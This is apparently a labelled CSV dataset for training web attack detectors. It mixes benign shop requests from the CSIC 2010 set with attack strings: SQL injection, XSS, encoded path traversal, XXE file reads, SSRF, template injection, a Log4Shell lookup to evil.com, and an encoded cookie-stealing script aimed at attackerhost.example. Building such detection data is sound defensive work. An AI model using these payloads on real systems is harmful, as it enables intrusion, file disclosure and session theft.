payload,label,source
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=26E68DA3DC4E1E61E51C4F79F781FDCA Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=D0BB2130396CB57F541FC519C849A04E Connection: close",normal,csic_2010
%f0%80%80%ae%f0%80%80%ae%u2216%f0%80%80%ae%f0%80%80%ae%u2216boot.ini,path_traversal,payloads_all_the_things
${jndi:iiop://evil.com:389/test},log4shell,augmented
"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%7C HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=84D3AE10BBE76C1CB46740CE01EF272C Connection: close",command_injection,csic_2010
modo=registro&login=qinghui&password=disterminar&nombre=Nadra&apellidos=Busquets+Baduell&email=lillo_funk%40inoxled.ma&dni=22652909W&direccion=C%2F+Codigo+Correspondencia+Oficial+Correos-telegrafos%2C+42+13-B&ciudad=Peralta+de+Alcofea&cp=47814&provincia=V%2Biz%2Bcaya&ntc=5583449016514744&B1=Registrar,sqli,csic_2010
"<?xml version=""1.0""?><!DOCTYPE test [<!test847 test847 SYSTEM ""file:////proc/version"">]><test>&test847;</test>",xxe,augmented
"GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=BDE76B7D55F380FADEFA6161746B21C3 Connection: close",normal,csic_2010
gopher://localhost/internal,ssrf,augmented
"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=645076C5E302D587EE9A666BF2377E90 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0F1394661BAD4CEA6B9CFA8D0E21F199 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=4BAE6931BA8DCCDE8A60C6BB5432370E Connection: close",normal,csic_2010
%27||echo%20RTVDXH$((26%2B45))$(echo%20RTVDXH)RTVDXH//,command_injection,seclists
"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=9FE8EAC47235118475212DABED80CC08 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=29D59CDC56F2E1734A020034E75FC41C Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=8223&B1=Confirmar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=5ABDA73309D7C1DA1682073E55C3EDEB Connection: close",sqli,csic_2010
C:\Program Files\WindowsApps\microsoft.net.native.runtime.1.7_1.7.27422.0_x86__8wekyb3d8bbwe\appxblockmap.xml,path_traversal,seclists
"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=C840274F9EF409C8B06DDD0A2FC5AD6E Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE},path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=2B315C693D3DB2B9477E34B877DD805C Connection: close",normal,csic_2010
%f8%80%80%80%ae%f8%80%80%80%ae%u2215etc%u2215passwd,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=neddie&pwd=0a392ne40&remember=off&B1=Entrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=EA27D3F40F64A09672C0703E25F1DF84 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=FB4CBCB293FA754636E676B9571FF4BD Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=DC2B237ECB61ED74929786C2BAB053C7 Connection: close",normal,csic_2010
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=ADA3BA97CDEF5A5BE5C411BE57BB9E53 Connection: close",normal,csic_2010
"<dd onmouseenter=""alert(1)"">test</dd>",xss,seclists
"GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=FC9587CECFFB6A83A8C7080A24984621 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=39627AD55F514CD43CCB7A07A9E711D1 Connection: close",normal,csic_2010
modo=insertar&precio=9629&B1=Confirmar,normal,csic_2010
%c0%2e%c0%2e%uEFC8%c0%2e%c0%2e%uEFC8%c0%2e%c0%2e%uEFC8%c0%2e%c0%2e%uEFC8%c0%2e%c0%2e%uEFC8windows%uEFC8system32%uEFC8drivers%uEFC8etc%uEFC8hosts,path_traversal,payloads_all_the_things
"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=7FF32CCFD65401698122881DE8DD55A3 Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
../../../../proc/self/fd/0%00,path_traversal,seclists
/etc/magicfilter/ps400-filter,path_traversal,seclists
/etc/init.d/pcscd,path_traversal,seclists
"GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=391B5FCDC61F45B86CD4CBCD7F652DDC Connection: close",normal,csic_2010
modo=entrar&login=welten&pwd=1am2o233E29&remember=off&B1=Entrar,normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=8D1889E2CC90425F3B9CF8D69EF7730C Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=872259068D75BD747DA03053FD8D686D Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=1E43E069D1B36F7DE71BE414379673B8 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=6562FC87DFB9D400BB7A25335016A555 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=B8C2A9E9E3303BB828A0F0FA4DD43090 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=ACF5E294C94ED53F332CD7E864B0EF80 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=zander&password=arca%EDsta&nombre=Zain&apellidos=Espriella+Morcossessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&email=skala%40lamarsrl.la&dni=28264646S&direccion=Nardo%2C+106%2C+7-H&ciudad=Torrecampo&cp=46315&provincia=Alicante&ntc=5436324330428646&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=825753F0CB64DC6A785C0C19A98BB491 Connection: close",sqli,csic_2010
C:\Windows\diagnostics\system\iesecurity\rs_iesecuritylevels.ps1,path_traversal,seclists
"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=88&B1=A%F1adir+al+carrito HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=05EFE2FF06C69D288B42115613863C47 Connection: close",normal,csic_2010
/etc/efax-gtkrc,path_traversal,seclists
id=3&nombre=Vino+Rioja&precio=85&cantidad=40&B1=A%F1adir+al+carrito,normal,csic_2010
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kizzee&password=malojal&nombre=Remigio&apellidos=Lizama+Vielmas&email=lundy%40academiaversal.pm&dni=90471972T&direccion=C%2F+Prado%2C+132+&ciudad=Dos+Hermanas&cp=48192&provincia=Cuenca&ntc=1286497435313401&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0B1EAD63C65D5C587F4EC16FFDD53494 Connection: close",normal,csic_2010
/etc/otrs/Output/HTML/Lite/AdminQueueAutoResponseForm.dtl,path_traversal,seclists
"GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=4C0A5ACDB6C521B33E652C36771E80B5 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=6D326C874E9DAD8E12F928190D3542D8 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=cosette&password=gladio&nombre=Giannina&apellidos=Canciller+Aiguad%E9&email=manojlovic%40ebaz.lb&dni=45067285G&direccion=C%2F+David+164+&ciudad=Navas+de+la+Concepci%F3n%2C+Las&cp=41340&provincia=Lugo&ntc=0957957573117060&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=13117062FE0AE9E9628A4C5163461C8F Connection: close",normal,csic_2010
%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/boot.ini,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=A6445C766017BD46449C30F820DE17DE Connection: close",normal,csic_2010
"<?xml version=""1.0""?><!DOCTYPE foo [<!data855 data855 SYSTEM ""netdoc://c:\boot.ini"">]><foo>&data855;</foo>",xxe,augmented
"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=BFE30235080C99761882659D2005A9B1 Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>",xss,payloads_all_the_things
"GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=D70D1DEA77905CCD360ED6CF40949E79 Connection: close",normal,csic_2010
@(val*3),ssti,augmented
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=A623384A98E74FB5B33A419EFCC6D23E Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=92B0436112FE3223116B0B908A9574C2 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=2293&B1=Confirmar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=3C660BB2B7B0129BC9A919AB15C5A541 Connection: close",sqli,csic_2010
